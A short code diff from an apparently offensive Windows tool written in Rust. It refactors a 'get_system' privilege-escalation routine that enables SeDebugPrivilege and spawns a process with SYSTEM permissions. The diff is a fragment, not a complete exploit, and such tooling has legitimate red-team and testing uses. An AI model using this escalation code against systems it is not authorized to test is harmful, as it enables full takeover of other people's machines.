@@ -1,5 +1,7 @@
-
-use crate::utilities::Utils;
+use crate::utilities::{
+    SE_DEBUG_NAME,
+    Utils,
+};
 
 use winapi::um::winbase::{ 
     LOGON_NETCREDENTIALS_ONLY, 
@@ -60,8 +62,7 @@ pub struct Escalation;
 impl Escalation {
     pub fn get_system(process_path: String) -> Result<()> {
         if Utils::is_elevated() {
-            let (boolean, _result) = Utils::enable_debug_privilege();
-            if boolean {
+            if Utils::enable_privilege(SE_DEBUG_NAME.as_ptr()) {
                 if spawn_shell(process_path.clone()) {
                     println!("[+] {} started with SYSTEM permissions", process_path);
                 } else {
